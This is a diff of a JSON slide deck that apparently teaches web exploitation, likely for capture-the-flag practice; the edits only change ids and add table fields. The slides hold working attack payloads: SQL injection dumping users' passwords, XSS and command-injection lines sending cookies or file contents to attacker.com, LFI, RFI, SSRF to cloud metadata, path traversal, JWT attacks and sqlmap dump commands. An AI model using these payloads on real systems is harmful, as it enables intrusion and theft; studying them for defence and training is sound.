@@ -4,7 +4,7 @@
   "source": "web/README.md",
   "slides": [
     {
-      "id": "0364d310-2fd8-46c4-9073-786837322d86",
+      "id": "8e872a3c-8490-4d3b-af84-86bec0036a3a",
       "layout": "center",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -19,6 +19,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -26,6 +30,7 @@
       "showSubtitle": true,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "center",
@@ -33,7 +38,7 @@
       "transition": "zoom"
     },
     {
-      "id": "b146a672-bdeb-4c3c-a980-83b4cc2c6a09",
+      "id": "e0569cc8-ac97-41bf-8438-fc972f25b4ae",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -48,6 +53,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Discover directories and files\nffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n\n# Discover virtual hosts / subdomains\nffuf -u http://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt\n\n# Technology fingerprinting\nwhatweb http://target.com\ncurl -s http://target.com | grep -i \"generator\\|powered\"\n\n# Check robots.txt and sitemap\ncurl http://target.com/robots.txt\ncurl http://target.com/sitemap.xml\n\n# Find JavaScript files for endpoints/secrets\nffuf -u http://target.com/FUZZ.js -w /usr/share/wordlists/dirb/common.txt",
       "codeLang": "bash",
       "imageUrl": "",
@@ -55,6 +64,7 @@
       "showSubtitle": false,
       "showBody": true,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -62,7 +72,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "6906e265-2fd0-4a5c-9389-c2a46b3291ef",
+      "id": "cf912855-76ca-4d9f-8d8d-15b80508a884",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -77,6 +87,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -84,6 +98,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -91,7 +106,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "385a7d70-1da6-4bd8-9eb2-36c02fed02d5",
+      "id": "889e42fe-6d58-4543-adf2-3eea4f72f059",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -106,6 +121,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Classic test payloads\n'\n''\n`\n')\n\"))\n' OR '1'='1\n' OR 1=1--\n' OR 1=1#\nadmin'--",
       "codeLang": "",
       "imageUrl": "",
@@ -113,6 +132,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -120,7 +140,7 @@
       "transition": "fade"
     },
     {
-      "id": "89f1662b-5857-4281-8170-c50736c4d1ee",
+      "id": "4bca1d07-92be-4c4f-a9ad-ef59da1a184a",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -135,6 +155,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--",
       "codeLang": "sql",
       "imageUrl": "",
@@ -142,6 +166,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -149,7 +174,7 @@
       "transition": "fade"
     },
     {
-      "id": "517052bd-60e6-45ac-8a1c-4b93c22f2351",
+      "id": "94192657-65ce-4cf0-9564-87f1501dc4cf",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -164,6 +189,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "' AND 1=1--   -- true\n' AND 1=2--   -- false",
       "codeLang": "sql",
       "imageUrl": "",
@@ -171,6 +200,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -178,7 +208,7 @@
       "transition": "fade"
     },
     {
-      "id": "493fe75a-abd5-425a-8d91-87dcdc700ae1",
+      "id": "817b9a73-04fb-497c-a05c-8d4d7de761a9",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -193,6 +223,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "' AND SLEEP(5)--           -- MySQL\n'; WAITFOR DELAY '0:0:5'-- -- MSSQL",
       "codeLang": "sql",
       "imageUrl": "",
@@ -200,6 +234,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -207,7 +242,7 @@
       "transition": "fade"
     },
     {
-      "id": "47a52cc4-2da3-4661-8a2e-aa12be1d0da8",
+      "id": "7d90d8c4-3b2c-4116-b684-aebc1ca6d212",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -222,6 +257,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "-- First, find number of columns\n' ORDER BY 1--\n' ORDER BY 2--\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n\n-- Then extract data\n' UNION SELECT username,password FROM users--",
       "codeLang": "sql",
       "imageUrl": "",
@@ -229,6 +268,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -236,7 +276,7 @@
       "transition": "fade"
     },
     {
-      "id": "2a78058c-fcbe-4f88-853c-a2481c88eead",
+      "id": "59fbb526-11dc-464a-979f-486ec617a688",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -251,6 +291,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Basic scan\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# With POST data\nsqlmap -u \"http://target.com/login\" --data=\"user=admin&pass=test\" --dbs\n\n# Dump a table\nsqlmap -u \"http://target.com/page?id=1\" -D database_name -T users --dump\n\n# With cookie\nsqlmap -u \"http://target.com/page\" --cookie=\"session=abc123\" --dbs",
       "codeLang": "bash",
       "imageUrl": "",
@@ -258,6 +302,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -265,7 +310,7 @@
       "transition": "fade"
     },
     {
-      "id": "03d15cca-c139-4da9-bfa9-1e0878cbd309",
+      "id": "2bf1dcd4-27bb-4ab2-950e-013a41fbbf3e",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -280,6 +325,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -287,6 +336,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -294,7 +344,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "59fd1797-8219-44ff-b22b-ff73595fbe82",
+      "id": "adf31c16-5137-48cf-8e23-eb4a36121bc9",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -309,6 +359,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(1)</script>\njavascript:alert(1)",
       "codeLang": "html",
       "imageUrl": "",
@@ -316,6 +370,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -323,7 +378,7 @@
       "transition": "fade"
     },
     {
-      "id": "1012a992-a6cb-463c-9593-f56e7075c589",
+      "id": "939acf7a-8088-4c0c-bf7d-e538c1a93cfe",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -338,6 +393,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "<script>document.location='http://attacker.com/?c='+document.cookie</script>\n<img src=x onerror=\"fetch('http://attacker.com/?c='+document.cookie)\">",
       "codeLang": "html",
       "imageUrl": "",
@@ -345,6 +404,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -352,7 +412,7 @@
       "transition": "fade"
     },
     {
-      "id": "a4f94a74-9602-49f7-bd70-adc20db2a4cc",
+      "id": "38b5336c-5f21-4c6a-8cd1-cc9df3926d83",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -367,6 +427,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "<ScRiPt>alert(1)</ScRiPt>\n<script>alert`1`</script>\n<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
       "codeLang": "html",
       "imageUrl": "",
@@ -374,6 +438,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -381,7 +446,7 @@
       "transition": "fade"
     },
     {
-      "id": "c18f39f8-541f-4fd0-b8ff-41d0319e07db",
+      "id": "85713b56-0eaa-41fc-bac9-528f04c7918a",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -396,6 +461,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# LFI classic\nhttp://target.com/page?file=../../../../etc/passwd\n\n# LFI with null byte (older PHP)\nhttp://target.com/page?file=../../../../etc/passwd%00\n\n# LFI via PHP wrappers\nhttp://target.com/page?file=php://filter/convert.base64-encode/resource=index.php\nhttp://target.com/page?file=php://input   (POST body as PHP)\n\n# Log poisoning via LFI\n# 1. Inject PHP in User-Agent\n# 2. Include the access log\nhttp://target.com/page?file=../../../../var/log/apache2/access.log\n\n# RFI (if allow_url_include is on)\nhttp://target.com/page?file=http://attacker.com/shell.txt",
       "codeLang": "",
       "imageUrl": "",
@@ -403,6 +472,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -410,7 +480,7 @@
       "transition": "fade"
     },
     {
-      "id": "7ee4e5e5-b9d3-4bd9-a584-d52da896ad7a",
+      "id": "2f459d6a-6f6c-4fce-bd1d-413d4d4b6070",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -425,6 +495,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Access internal services\nhttp://target.com/fetch?url=http://localhost/admin\nhttp://target.com/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)\nhttp://target.com/fetch?url=http://192.168.1.1/\n\n# SSRF filter bypass\nhttp://target.com/fetch?url=http://127.1/\nhttp://target.com/fetch?url=http://0177.0.0.1/   (octal)\nhttp://target.com/fetch?url=http://0x7f000001/    (hex)\n\n# SSRF to internal port scan\nhttp://target.com/fetch?url=http://localhost:22/\nhttp://target.com/fetch?url=http://localhost:3306/",
       "codeLang": "",
       "imageUrl": "",
@@ -432,6 +506,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -439,7 +514,7 @@
       "transition": "fade"
     },
     {
-      "id": "61ef60c3-033f-468c-8ae9-5eef2aae58e5",
+      "id": "76a774bb-50ed-4f02-8f0a-2c6d500d5137",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -454,6 +529,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -461,6 +540,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -468,7 +548,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "4b6ff170-57c6-4de9-9c4d-48920e5952a3",
+      "id": "c13c73b8-50be-48fd-9edd-b411e56e0d83",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -483,6 +563,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "admin:admin\nadmin:password\nadmin:123456\nguest:guest",
       "codeLang": "",
       "imageUrl": "",
@@ -490,6 +574,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -497,7 +582,7 @@
       "transition": "fade"
     },
     {
-      "id": "8f754e9e-3885-4082-aa09-c8fbfc226b09",
+      "id": "61ce4ca9-e559-4c7d-b86b-2a95b197e93a",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -512,6 +597,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Decode JWT (base64 each section)\necho \"eyJ...\" | base64 -d\n\n# Algorithm confusion: change \"alg\": \"RS256\" → \"HS256\", sign with public key\n\n# \"alg\": \"none\" attack\n# Set algorithm to none and remove signature\n\n# Crack JWT secret\nhashcat -m 16500 jwt.txt wordlist.txt",
       "codeLang": "bash",
       "imageUrl": "",
@@ -519,6 +608,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -526,7 +616,7 @@
       "transition": "fade"
     },
     {
-      "id": "55a9458f-5194-49b2-828b-8f1f41c3655a",
+      "id": "8b8e8f9e-afce-45d8-a855-d0f3f614af28",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -545,6 +635,10 @@
         "Redirect URI manipulation",
         "Token leakage in Referer"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -552,6 +646,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -559,7 +654,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "028242f8-18d0-4c45-9072-bfba13bc8059",
+      "id": "219f672a-989a-43c6-9335-921418de35b0",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -574,6 +669,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Test payloads\n; id\n| id\n`id`\n$(id)\n& id\n&& id\n\n# Blind (time-based)\n; sleep 5\n\n# Exfiltration\n; curl http://attacker.com/$(id)\n; curl http://attacker.com/?x=$(cat /flag | base64)",
       "codeLang": "bash",
       "imageUrl": "",
@@ -581,6 +680,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -588,7 +688,7 @@
       "transition": "fade"
     },
     {
-      "id": "5115dfdf-bebc-4fc9-9d18-1f17410699b2",
+      "id": "5e8d8970-cc69-4222-a81b-a02c3b8d5193",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -603,6 +703,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "../../../etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n....//....//....//etc/passwd",
       "codeLang": "",
       "imageUrl": "",
@@ -610,6 +714,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -617,7 +722,7 @@
       "transition": "fade"
     },
     {
-      "id": "eed1065f-6254-47b1-b9a7-a3c84f56bd34",
+      "id": "b49531f9-f4f4-410d-aaf8-ba99a7a2df6f",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -637,6 +742,10 @@
         "Java: ObjectInputStream — ysoserial gadget chains",
         "Node.js: node-serialize — $$NDFUNC$$_ function notation"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -644,6 +753,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -651,7 +761,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "7f833a41-0aae-463b-a274-d98fa00c6cf0",
+      "id": "e785adbc-46b8-4f3d-98b7-8e6aa647ca3d",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -666,6 +776,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nReferer: http://target.com/admin\nHost: internal.target.com",
       "codeLang": "",
       "imageUrl": "",
@@ -673,6 +787,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -680,7 +795,7 @@
       "transition": "fade"
     },
     {
-      "id": "cadf43fa-7b87-4e01-a8df-b6615a138d08",
+      "id": "b5647ae5-60b9-4978-bddc-1db3e6499c8b",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -694,21 +809,43 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Task  ::  Tool",
-        "Proxy / intercept  ::  Burp Suite",
-        "Directory fuzzing  ::  ffuf, gobuster",
-        "SQLi automation  ::  sqlmap",
-        "Vulnerability scan  ::  nikto",
-        "Quick HTTP requests  ::  curl"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Task",
+          "Tool"
+        ],
+        "rows": [
+          [
+            "Proxy / intercept",
+            "Burp Suite"
+          ],
+          [
+            "Directory fuzzing",
+            "ffuf, gobuster"
+          ],
+          [
+            "SQLi automation",
+            "sqlmap"
+          ],
+          [
+            "Vulnerability scan",
+            "nikto"
+          ],
+          [
+            "Quick HTTP requests",
+            "curl"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -716,7 +853,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "5c8d7059-0112-4af4-a9ed-b8ae9eb4e1bd",
+      "id": "a37b886d-e98a-4a4b-ab1b-5a4022b57d54",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -736,6 +873,10 @@
         "HackTricks Web — technique reference",
         "OWASP Top 10"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -743,6 +884,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
